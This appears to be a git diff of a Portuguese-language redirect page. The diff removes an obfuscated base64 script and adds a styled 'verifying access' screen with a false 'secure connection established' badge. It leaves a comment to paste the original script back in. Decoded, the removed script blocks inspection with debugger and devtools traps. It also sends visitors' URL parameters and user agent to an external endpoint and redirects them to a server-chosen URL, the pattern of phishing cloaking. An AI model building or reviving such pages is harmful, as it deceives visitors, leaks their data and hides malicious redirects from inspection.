@@ -1,17 +1,179 @@
 <!DOCTYPE html>
 <html lang="pt-BR">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Redirecionando...</title>
-</head>
-<body>
-  <p style="text-align:center;font-family:sans-serif;margin-top:50px;">
-    Redirecionando...
-  </p>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
 
+<title>Preparando seu acesso...</title>
+
+<style>
+*{
+    margin:0;
+    padding:0;
+    box-sizing:border-box;
+}
+
+body{
+    min-height:100vh;
+    display:flex;
+    justify-content:center;
+    align-items:center;
+    font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,sans-serif;
+    background:linear-gradient(135deg,#0f172a,#111827,#1e293b);
+    color:#fff;
+    overflow:hidden;
+}
+
+.bg{
+    position:fixed;
+    inset:0;
+    opacity:.3;
+    background:
+    radial-gradient(circle at 20% 20%,#3b82f6 0%,transparent 30%),
+    radial-gradient(circle at 80% 80%,#06b6d4 0%,transparent 30%);
+    animation:pulse 6s infinite alternate;
+}
+
+@keyframes pulse{
+    from{transform:scale(1);}
+    to{transform:scale(1.15);}
+}
+
+.card{
+    position:relative;
+    z-index:2;
+    width:92%;
+    max-width:420px;
+    background:rgba(255,255,255,.05);
+    backdrop-filter:blur(20px);
+    border:1px solid rgba(255,255,255,.1);
+    border-radius:24px;
+    padding:35px;
+    text-align:center;
+    box-shadow:0 25px 60px rgba(0,0,0,.35);
+}
+
+.icon{
+    width:90px;
+    height:90px;
+    margin:0 auto 20px;
+    border-radius:50%;
+    display:flex;
+    align-items:center;
+    justify-content:center;
+    font-size:40px;
+    background:rgba(255,255,255,.08);
+}
+
+h1{
+    font-size:24px;
+    margin-bottom:10px;
+}
+
+.desc{
+    color:#cbd5e1;
+    line-height:1.5;
+    font-size:15px;
+}
+
+.loader{
+    width:70px;
+    height:70px;
+    margin:28px auto;
+    border:5px solid rgba(255,255,255,.12);
+    border-top:5px solid #3b82f6;
+    border-radius:50%;
+    animation:spin 1s linear infinite;
+}
+
+@keyframes spin{
+    to{
+        transform:rotate(360deg);
+    }
+}
+
+.progress{
+    width:100%;
+    height:8px;
+    background:rgba(255,255,255,.08);
+    border-radius:999px;
+    overflow:hidden;
+    margin-top:15px;
+}
+
+.progress span{
+    display:block;
+    height:100%;
+    width:40%;
+    background:linear-gradient(90deg,#3b82f6,#06b6d4);
+    border-radius:999px;
+    animation:loading 1.5s infinite;
+}
+
+@keyframes loading{
+    0%{
+        margin-left:-40%;
+    }
+    100%{
+        margin-left:100%;
+    }
+}
+
+.status{
+    margin-top:18px;
+    color:#94a3b8;
+    font-size:13px;
+}
+
+.badge{
+    display:inline-flex;
+    align-items:center;
+    gap:8px;
+    margin-top:18px;
+    background:rgba(34,197,94,.15);
+    color:#86efac;
+    padding:10px 14px;
+    border-radius:999px;
+    font-size:13px;
+}
+</style>
+</head>
+
+<body>
+
+<div class="bg"></div>
+
+<div class="card">
+
+    <div class="icon">🔒</div>
+
+    <h1>Verificando acesso</h1>
+
+    <p class="desc">
+        Estamos preparando seu acesso seguro.
+        Você será redirecionado automaticamente em alguns instantes.
+    </p>
+
+    <div class="loader"></div>
+
+    <div class="progress">
+        <span></span>
+    </div>
+
+    <div class="badge">
+        ✓ Conexão segura estabelecida
+    </div>
+
+    <div class="status">
+        Aguarde alguns segundos...
+    </div>
+
+</div>
+
+<!-- COLE AQUI SEU SCRIPT ORIGINAL SEM ALTERAR NADA -->
 <script>
-(function(_0x1a2b,_0x3c4d){var _0x5e6f=function(_0x7g8h){return decodeURIComponent(escape(atob(_0x7g8h)));};var _0x9i0j=_0x5e6f(_0x1a2b);(new Function(_0x9i0j))();})("KGZ1bmN0aW9uKCl7CnZhciBfMHhhMT0iYm90LTBmNzBmYjA4IixfMHhiMj0iaHR0cHM6Ly9nZmFrYnJkdm5mdXR6bmh5dXZydi5zdXBhYmFzZS5jby9mdW5jdGlvbnMvdjEvdHJhY2stZXh0ZXJuYWwtY2xpY2siOwp2YXIgXzB4YzM9ZnVuY3Rpb24oKXt2YXIgdD1uZXcgRGF0ZSgpO2RlYnVnZ2VyO3JldHVybiBuZXcgRGF0ZSgpLXQ+MTAwO307CnNldEludGVydmFsKGZ1bmN0aW9uKCl7aWYoXzB4YzMoKSl7ZG9jdW1lbnQuYm9keS5pbm5lckhUTUw9IiI7d2luZG93LmxvY2F0aW9uLmhyZWY9ImFib3V0OmJsYW5rIjt9fSwxMDAwKTsKdmFyIF8weGQ0PWZ1bmN0aW9uKCl7dmFyIHc9d2luZG93Lm91dGVyV2lkdGgtd2luZG93LmlubmVyV2lkdGg+MTYwLGg9d2luZG93Lm91dGVySGVpZ2h0LXdpbmRvdy5pbm5lckhlaWdodD4xNjA7aWYod3x8aCl7ZG9jdW1lbnQuYm9keS5pbm5lckhUTUw9IiI7d2luZG93LmxvY2F0aW9uLmhyZWY9ImFib3V0OmJsYW5rIjt9fTsKc2V0SW50ZXJ2YWwoXzB4ZDQsNTAwKTsKKGZ1bmN0aW9uKCl7dmFyIF8weGU1PXt9O25ldyBVUkxTZWFyY2hQYXJhbXMod2luZG93LmxvY2F0aW9uLnNlYXJjaCkuZm9yRWFjaChmdW5jdGlvbih2LGspe18weGU1W2tdPXY7fSk7CmZldGNoKF8weGIyLHttZXRob2Q6IlBPU1QiLGhlYWRlcnM6eyJDb250ZW50LVR5cGUiOiJhcHBsaWNhdGlvbi9qc29uIn0sYm9keTpKU09OLnN0cmluZ2lmeSh7c2hvcnRDb2RlOl8weGExLHF1ZXJ5UGFyYW1zOl8weGU1LHVzZXJBZ2VudDpuYXZpZ2F0b3IudXNlckFnZW50LHVybENvbXBsZXRvOndpbmRvdy5sb2NhdGlvbi5zZWFyY2guc3Vic3RyaW5nKDEpfHxudWxsfSl9KQoudGhlbihmdW5jdGlvbihyKXtyZXR1cm4gci5qc29uKCk7fSkudGhlbihmdW5jdGlvbihkKXtpZihkJiZkLnJlZGlyZWN0VXJsKXt3aW5kb3cubG9jYXRpb24uaHJlZj1kLnJlZGlyZWN0VXJsO319KS5jYXRjaChmdW5jdGlvbigpe30pOwp9KSgpOwp9KSgpOw==");
+/* seu script atual */
 </script>
+
 </body>
 </html>
